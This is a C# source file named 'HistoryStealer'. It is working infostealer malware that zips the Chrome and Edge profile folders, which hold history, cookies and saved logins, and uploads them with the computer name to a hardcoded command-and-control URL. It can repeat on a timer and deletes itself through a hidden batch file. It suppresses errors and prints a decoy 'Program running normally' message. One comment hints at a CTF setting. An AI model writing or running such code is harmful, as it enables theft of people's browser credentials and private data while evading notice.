using System;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace HistoryStealer
{
    // Configuration class with hardcoded settings
    public class Config
    {
        public static readonly string C2Url = "https://example.com/upload";
        public static readonly string ChromePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            @"Google\Chrome\User Data\Default");
        public static readonly string EdgePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            @"Microsoft\Edge\User Data\Default");
        public static readonly string TempZipPath = Path.Combine(Path.GetTempPath(), "browser_data.zip");
        // These will be replaced by builder.py
        public static readonly string Target = "BOTH"; // CHROME, EDGE, or BOTH
        public static readonly int Hours = 0; // 0 for once, N for every N hours
        public static readonly bool SelfDestruct = false; // true to enable self-destruction
    }

    // Class to handle zipping browser data
    public class BrowserDataZipper
    {
        public static void CreateZip()
        {
            if (File.Exists(Config.TempZipPath))
                File.Delete(Config.TempZipPath);

            using (var zip = ZipFile.Open(Config.TempZipPath, ZipArchiveMode.Create))
            {
                if (Config.Target == "CHROME" || Config.Target == "BOTH")
                    AddFolderToZip(zip, Config.ChromePath, "chrome");
                if (Config.Target == "EDGE" || Config.Target == "BOTH")
                    AddFolderToZip(zip, Config.EdgePath, "edge");
            }
        }

        private static void AddFolderToZip(ZipArchive zip, string folderPath, string entryPrefix)
        {
            if (!Directory.Exists(folderPath))
                return;

            foreach (var file in Directory.GetFiles(folderPath))
            {
                zip.CreateEntryFromFile(file, Path.Combine(entryPrefix, Path.GetFileName(file)));
            }
        }
    }

    // Class to handle uploading
    public class Uploader
    {
        private static readonly HttpClient client = new HttpClient();

        public static async Task UploadZipAsync(string computerName)
        {
            if (!File.Exists(Config.TempZipPath))
                return;

            try
            {
                using (var content = new MultipartFormDataContent())
                {
                    // Add JSON metadata
                    var jsonData = new { ComputerName = computerName };
                    var jsonContent = new StringContent(
                        JsonSerializer.Serialize(jsonData),
                        System.Text.Encoding.UTF8,
                        "application/json");
                    content.Add(jsonContent, "metadata");

                    // Add zip file
                    var fileContent = new ByteArrayContent(File.ReadAllBytes(Config.TempZipPath));
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
                    content.Add(fileContent, "file", "browser_data.zip");

                    // Send to C2
                    await client.PostAsync(Config.C2Url, content);
                }
            }
            catch (Exception)
            {
                // Suppress errors for CTF simplicity
            }
            finally
            {
                // Always delete zip after upload
                if (File.Exists(Config.TempZipPath))
                    File.Delete(Config.TempZipPath);
            }
        }
    }

    // Class for self-destruction
    public class SelfDestruct
    {
        public static void DeleteSelf()
        {
            try
            {
                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string batchFile = Path.Combine(Path.GetTempPath(), "delete.bat");
                File.WriteAllText(batchFile, 
                    $"@echo off\n" +
                    $"ping 127.0.0.1 -n 2 > nul\n" +
                    $"del \"{exePath}\"\n" +
                    $"del \"%~f0\"");
                
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = batchFile,
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch (Exception)
            {
                // Suppress errors
            }
        }
    }

    class Program
    {
        static async Task Main(string[] args)
        {
            do
            {
                // Zip and upload
                BrowserDataZipper.CreateZip();
                await Uploader.UploadZipAsync(Environment.MachineName);

                // Self-destruct if enabled
                if (Config.SelfDestruct)
                {
                    SelfDestruct.DeleteSelf();
                    break;
                }

                // Wait if repeating
                if (Config.Hours > 0)
                    await Task.Delay(Config.Hours * 60 * 60 * 1000);
            } while (Config.Hours > 0);

            // Decoy output
            Console.WriteLine("Program running normally.");
        }
    }
}